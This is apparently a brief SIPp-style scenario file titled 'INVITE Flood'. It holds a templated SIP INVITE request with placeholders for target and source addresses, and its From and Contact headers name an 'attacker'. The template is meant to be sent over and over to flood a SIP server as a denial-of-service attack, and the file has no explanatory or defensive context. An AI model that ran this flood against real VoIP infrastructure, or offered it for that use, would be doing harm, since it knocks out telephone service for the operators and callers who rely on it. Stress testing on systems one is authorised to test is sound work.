scenario.name: INVITE Flood
scenario.send: INVITE sip:[remote_ip]:5060 SIP/2.0 Via: SIP/2.0/UDP [local_ip]:[local_port];branch=[branch] From: <sip:attacker@[local_ip]>;tag=[call_number] To: <sip:[remote_ip]> Call-ID: flood-[call_number]@[local_ip] CSeq: [cseq] INVITE Max-Forwards: 70 Contact: <sip:attacker@[local_ip]:[local_port]> Content-Length: 0
